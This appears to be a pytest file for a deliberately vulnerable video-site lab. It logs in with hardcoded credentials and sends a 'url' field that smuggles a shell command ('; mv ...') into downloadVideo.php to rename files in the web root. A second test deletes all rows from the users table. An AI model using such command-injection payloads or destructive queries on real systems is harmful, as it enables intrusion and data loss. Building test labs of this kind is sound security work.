import requests
import pytest
import pymysql 
conn=pymysql.connect(host='127.0.0.1',
                         port=33060,
                         user='videos4u',
                         password='olah6aeQuie7Oishol4Eej6oofee3aeg',
                         database='videos4u_web')
query = conn.cursor()
def login():
    data = {'username': 'jimstark', 'password': 'password1'}
    try:
        page = requests.post("https://localhost/core/login/login.php",data=data, verify=False)
    except:
        page = None
    assert page != None
    assert '{"success": true}' in page.text
    return page.headers["Set-Cookie"][8:136]

def test_resetAIndex():
    try:
        page = requests.get("https://localhost/index.html", verify=False)
    except:
        page = None
    assert page.status_code == 404
    session = {"session": login()}
    data = {"title":"rekt","url": "https://127.0.0.1/exec.mp4; mv /var/www/html/index.rekt /var/www/html/index.html"}
    try:
        page = requests.post("https://localhost/core/video/downloadVideo.php",data=data, cookies=session, verify=False)
    except:
        page = None
    try:
        page = requests.get("https://localhost/index.html", verify=False)
    except:
        page = None
    assert page.status_code == 200


def test_resetDatbase():
    query.execute("DELETE FROM users")
    
    query.execute("SELECT username FROM users")
    test = query.fetchall()
    conn.commit()
    query.close()
    assert ('paulasmith',) not in test
    assert ('tomcampbell',) not in test
    assert ('jimstark',) not in test

